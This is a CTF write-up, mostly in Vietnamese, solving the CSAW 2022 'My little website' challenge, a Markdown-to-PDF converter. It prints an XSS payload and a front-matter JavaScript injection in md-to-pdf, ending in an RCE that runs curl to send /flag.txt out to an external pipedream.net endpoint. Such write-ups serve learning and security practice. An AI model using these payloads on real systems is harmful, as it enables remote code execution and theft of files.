# **CSAW CTF 2022**
## **My little website** 
___
### **Description:**

I am new to programming and made this simple pdf creater website here, hopefully it is secure enough :)...
```
http://web.chal.csaw.io:5013
```
Author: Anish Agrawal (@roborobo#5025)

Hint: The flag is located at /flag.txt. AWS is completely out of scope.
___

### **TL;DR**

Đã có bài tương tự như bài này từng release. Các bạn có thể xem thêm tại đây:

https://ctftime.org/task/21497

### **Recon:**

Input vào 1 đoạn MD Code và chương trình sẽ render sang pdf

![1.png](https://github.com/L4P1Nz/CSAW-2022/blob/main/My%20little%20website/1.png)

Mình nghĩ ngay đến SSTI hoặc XSS. Và thật sự là nó có thể XSS thật, nhưng mà XSS không phải là key của bài này.

Payload XSS:

```
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET","/flag.txt");
xhr.onload = function(){
    var c = btoa(xhr.responseText);
    var exfil = new XMLHttpRequest();
    exfil.open("GET","https://eofjinqeit74ydj.m.pipedream.net?c=" + c);
    exfil.send();
};
xhr.send();
</script>
```
Result:

![2.png](https://github.com/L4P1Nz/CSAW-2022/blob/main/My%20little%20website/2.png)

Vì đây chỉ là self xss thôi nên không có quá nhiều để khai thác

### **Searching...**

Sau khi search và thử vài POC thì mình tìm được cái issue này :

https://github.com/simonhaenisch/md-to-pdf/issues/99 

Ném cái payload này vào để xem thế nào

```
---js
{
    css: `body::before { content: "${require('fs').readdirSync('/').join()}"; display: block }`,
}
---
```

Result:

![3.png](https://github.com/L4P1Nz/CSAW-2022/blob/main/My%20little%20website/3.png)

Có vẻ là đi đúng hướng của bài rồi xDD
### **Exploit:**

Tìm vài bài write up ctf về cái vuln này.

Sau cùng thì mình đã lấy được flag với cái payload này:

```
---js
((require("child_process")).execSync("curl https://eofjinqeit74ydj.m.pipedream.net/?c=$(cat /flag.txt | base64)"))
---RCE
```


![4.png](https://github.com/L4P1Nz/CSAW-2022/blob/main/My%20little%20website/4.png)




